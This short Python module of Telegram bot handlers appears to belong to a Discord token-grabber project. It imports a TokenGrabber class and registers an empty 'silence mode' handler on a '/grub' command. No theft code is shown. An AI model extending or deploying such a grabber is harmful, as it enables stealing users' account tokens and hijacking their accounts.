"""Модуль с обработчиками команд Grabber`a"""
from aiogram.dispatcher.filters import Text
from aiogram.types import Message, CallbackQuery
from aiogram.dispatcher import FSMContext

from discord_grabber import TokenGrabber
from config import logger, Dispatcher


@logger.catch
async def silence_mode_handler(message: Message):
    """Включает тихий режим"""

    pass


@logger.catch
def register_handlers(dp: Dispatcher) -> None:
    """
    Регистратор для функций данного модуля
    """

    dp.register_message_handler(silence_mode_handler, commands=["grub"])
